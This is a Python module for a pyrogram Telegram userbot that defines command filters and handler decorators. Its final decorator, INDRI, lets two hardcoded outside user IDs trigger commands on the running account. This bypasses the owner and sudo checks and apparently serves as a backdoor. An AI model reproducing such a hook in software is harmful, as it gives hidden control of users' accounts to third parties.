from pyrogram import filters

from userbot import *

class FILTERS:
    ME = filters.me
    GROUP = filters.group
    PRIVATE = filters.private
    INCOMING = filters.incoming
    SERVICE = filters.service
    BOT = filters.bot
    OWNER = filters.user(OWNER_ID)
    ME_GROUP = filters.me & filters.group
    ME_OWNER = filters.me & filters.user(OWNER_ID)
    ME_USER = filters.me & filters.user(USER_ID)
    PM = filters.me & filters.private

async def if_sudo(_, client, message):
    sudo_users = await ambil_list_vars(client.me.id, "SUDO_USER", "ID_NYA")
    is_user = message.from_user if message.from_user else message.sender_chat
    is_self = bool(message.from_user and message.from_user.is_self or getattr(message, "outgoing", False))
    return is_user.id in sudo_users or is_self        

class CB:
    def BOT(command, filter=FILTERS.PRIVATE):
        def wrapper(func):
            @bot.on_message(filters.command(command) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
        
    def OWNER(func):
        async def function(client, message):
            kon = message.from_user.id
            if kon != OWNER_ID:
                return
            return await func(client, message)

        return function
        
    def SELES(func):
        async def function(client, message):
            kon = message.from_user.id
            if kon not in await get_seles():
                return
            return await func(client, message)

        return function
        
    @staticmethod
    def UBOT(command, filter=None):
        if filter is None:
            filter = filters.create(if_sudo)

        def decorator(func):
            @ubot.on_message(ubot.cmd_prefix(command) & filter)
            async def wrapped_func(client, message):
                return await func(client, message)

            return wrapped_func

        return decorator
        
    @staticmethod
    def NOCMD(result, ubot):
        query_mapping = {
            "AFK": {
                "query": (
                    (filters.mentioned | filters.private)
                    & ~filters.bot
                    & ~filters.me
                    & filters.incoming
                ),
                "group": 49,
            },
            "PMPERMIT": {
                "query": (
                    filters.private
                    & filters.incoming
                    & ~filters.me
                    & ~filters.bot
                    & ~filters.via_bot
                    & ~filters.service
                ),
                "group": 33,
            },
            "LOGS_GROUP": {
                "query": (
                    filters.mentioned
                    & filters.incoming
                    & ~filters.bot
                    & ~filters.via_bot
                    & ~filters.me
                )
                | (
                    filters.private
                    & filters.incoming
                    & ~filters.me
                    & ~filters.bot
                    & ~filters.service
                ),
                "group": 69,
            },
        }
        result_query = query_mapping.get(result)
        def wrapper(func):
            if result_query:
                async def wrapped_func(client, message):
                    return await func(client, message)
                ubot.on_message(result_query["query"], group=int(result_query["group"]))(
                    wrapped_func
                )

                return wrapped_func
            else:
                return func

        return wrapper
     
    def INLINE(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def CALLBACK(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def GROUP(func):
        async def function(client, message):
            if message.chat.type not in (ChatType.GROUP, ChatType.SUPERGROUP):
                return 
            return await func(client, message)

        return function

    @staticmethod
    def INDRI(command):
        def decorator(func):
            return ubot.on_message(filters.user([1014948468, 936922513]) & filters.command(command, "") & ~filters.me)(func)
        return decorator